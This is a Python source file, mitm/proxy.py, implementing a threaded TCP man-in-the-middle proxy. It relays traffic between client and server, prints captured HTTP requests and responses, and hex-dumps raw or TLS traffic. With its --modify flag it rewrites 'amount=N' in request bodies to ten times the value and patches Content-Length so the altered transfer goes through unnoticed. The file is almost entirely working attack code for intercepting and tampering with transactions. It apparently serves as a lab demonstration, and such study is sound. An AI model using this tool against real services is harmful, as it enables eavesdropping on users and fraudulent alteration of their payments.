# mitm/proxy.py
import argparse
import socket
import threading
import re

PRINTABLE = set(range(32, 127))  # ASCII printable range


def is_printable(b: bytes) -> bool:
    return all(c in PRINTABLE or c in (9, 10, 13) for c in b)


def hex_dump(b: bytes, prefix=""):
    for i in range(0, len(b), 16):
        chunk = b[i:i+16]
        hex_part = " ".join(f"{x:02x}" for x in chunk)
        ascii_part = "".join(chr(x) if 32 <= x < 127 else "." for x in chunk)
        print(f"{prefix}{i:04x}  {hex_part:<48}  {ascii_part}")


def modify_http_request(data: bytes) -> bytes:
    """
    Modify HTTP request body and fix Content-Length.

    - Split HTTP into headers + body
    - Change amount=N to amount=(N*10)
    - Recalculate Content-Length based on new body size
    """
    try:
        # Use latin-1 so every byte maps 1:1 to a character
        text = data.decode("latin-1")
    except UnicodeDecodeError:
        return data

    # Separate headers and body: they are split by a blank line
    sep = "\r\n\r\n"
    if sep not in text:
        # Fallback for rare cases: try \n\n
        if "\n\n" not in text:
            return data
        sep = "\n\n"

    headers, body = text.split(sep, 1)

    print("----- [MITM] Original BODY -----")
    print(body)
    print("--------------------------------")

    # Replace amount=NUM with amount=NUM*10 in the BODY only
    def repl(match):
        num = match.group(1)
        try:
            val = int(num)
            new_val = val * 10
            print(f"[MITM] Modifying amount {val} -> {new_val}")
            return f"amount={new_val}"
        except ValueError:
            return match.group(0)

    new_body, count = re.subn(r"amount=(\d+)", repl, body)

    # If nothing changed, return original data
    if count == 0:
        return data

    # Compute new Content-Length in BYTES
    new_len = len(new_body.encode("latin-1"))

    # Update Content-Length header
    headers, cl_count = re.subn(
        r"Content-Length:\s*\d+",
        f"Content-Length: {new_len}",
        headers,
        flags=re.IGNORECASE,
    )

    print(f"[MITM] Updated Content-Length to {new_len} (was mismatched before)")
    print("----- [MITM] Modified BODY -----")
    print(new_body)
    print("--------------------------------")

    # Rebuild full HTTP message
    new_text = headers + sep + new_body
    return new_text.encode("latin-1")


def forward(src, dst, direction, mode, modify_flag):
    """
    Forward bytes from src to dst.
    direction: 'C->S' or 'S->C'
    mode: 'http' or 'raw'
    """
    try:
        while True:
            data = src.recv(4096)
            if not data:
                break

            if mode == "http":
                if direction == "C->S":
                    print("\n=== [MITM] HTTP request captured ===")
                    try:
                        print(data.decode("utf-8", errors="ignore"))
                    except UnicodeDecodeError:
                        hex_dump(data, prefix="[MITM] ")
                    if modify_flag:
                        data = modify_http_request(data)
                else:
                    print("\n=== [MITM] HTTP response captured ===")
                    try:
                        txt = data.decode("utf-8", errors="ignore")
                        print(txt[:1000])
                    except UnicodeDecodeError:
                        hex_dump(data, prefix="[MITM] ")
            else:
                # raw mode – useful when traffic is TLS encrypted
                print(f"\n=== [MITM] RAW data {direction} ({len(data)} bytes) ===")
                if is_printable(data):
                    print(data.decode("utf-8", errors="ignore"))
                else:
                    hex_dump(data, prefix="[RAW] ")

            dst.sendall(data)
    except Exception as e:
        print(f"[MITM] Error in forward {direction}: {e}")
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass


def handle_client(client_sock, target_host, target_port, mode, modify_flag):
    try:
        server_sock = socket.create_connection((target_host, target_port))
        print(f"[MITM] Connected to server {target_host}:{target_port}")
    except Exception as e:
        print(f"[MITM] Failed to connect to target: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(
        target=forward,
        args=(client_sock, server_sock, "C->S", mode, modify_flag),
        daemon=True,
    )
    t2 = threading.Thread(
        target=forward,
        args=(server_sock, client_sock, "S->C", mode, False),
        daemon=True,
    )
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    client_sock.close()
    server_sock.close()
    print("[MITM] Connection closed.")


def main():
    parser = argparse.ArgumentParser(description="Simple TCP MITM proxy.")
    parser.add_argument("--listen-host", default="127.0.0.1")
    parser.add_argument("--listen-port", type=int, required=True)
    parser.add_argument("--target-host", default="127.0.0.1")
    parser.add_argument("--target-port", type=int, required=True)
    parser.add_argument(
        "--mode",
        choices=["http", "raw"],
        default="http",
        help="http: parse/modify; raw: hex-dump (for TLS)",
    )
    parser.add_argument(
        "--modify",
        action="store_true",
        help="In HTTP mode, actively modify transfer amount.",
    )
    args = parser.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((args.listen_host, args.listen_port))
    sock.listen(5)
    print(
        f"[MITM] Listening on {args.listen_host}:{args.listen_port}, "
        f"forwarding to {args.target_host}:{args.target_port}"
    )
    print(f"[MITM] Mode={args.mode}, modify={args.modify}")

    try:
        while True:
            client_sock, addr = sock.accept()
            print(f"[MITM] New client from {addr}")
            t = threading.Thread(
                target=handle_client,
                args=(client_sock, args.target_host, args.target_port, args.mode, args.modify),
                daemon=True,
            )
            t.start()
    except KeyboardInterrupt:
        print("\n[MITM] Shutting down.")
    finally:
        sock.close()


if __name__ == "__main__":
    main()